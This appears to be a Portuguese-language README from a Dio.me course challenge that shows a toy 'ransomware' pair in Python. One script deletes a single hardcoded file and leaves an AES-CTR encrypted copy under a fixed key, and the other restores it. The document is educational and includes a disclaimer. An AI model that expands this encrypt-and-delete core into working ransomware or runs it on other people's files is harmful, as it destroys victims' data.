# projeto_ransomware


🔐 Desafio Ransomware – Dio.me

Este projeto foi desenvolvido como parte de um **desafio prático da Dio.me**, simulando o funcionamento de um **processo simples de encriptação e decriptação de arquivos** para fins de estudo.

⚠️ Aviso:  
Este código é apenas para fins educacionais e de teste.  
Não utilize em ambientes reais nem para fins maliciosos.

______

📂 Arquivos principais
- encrypter.py → Responsável por encriptar o arquivo alvo.  
- decrypter.py → Responsável por descriptografar o arquivo encriptado, retornando-o ao formato legível.

______

▶️ Funcionamento do `encrypter.py`

import os
import pyaes

  #Abrir o arquivo a ser criptografado
file_name = "arquivo.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

  #Remover o arquivo original
os.remove(file_name)

  #Definir chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

  #Criptografar o arquivo
crypto_data = aes.encrypt(file_data)

  #Salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()



▶️ Funcionamento do decrypter.py

import os
import pyaes

  #Abrir o arquivo criptografado
file_name = "arquivo.txt.ransomwaretroll"
file = open(file_name, "rb")
file_data = file.read()
file.close()

  #Definir chave de descriptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)
decrypt_data = aes.decrypt(file_data)

  #Remover o arquivo criptografado
os.remove(file_name)

  #Criar o arquivo decriptado (legível novamente)
new_file = "arquivo.txt"
new_file = open(f'{new_file}', "wb")
new_file.write(decrypt_data)
new_file.close()


⚙️ Como usar

Crie um arquivo de teste chamado arquivo.txt no diretório do projeto.

Execute o encriptador:
python encrypter.py      #Isso removerá o arquivo original e criará arquivo.txt.ransomwaretroll

Para recuperar o arquivo, execute:
python decrypter.py      #O arquivo original arquivo.txt será restaurado.
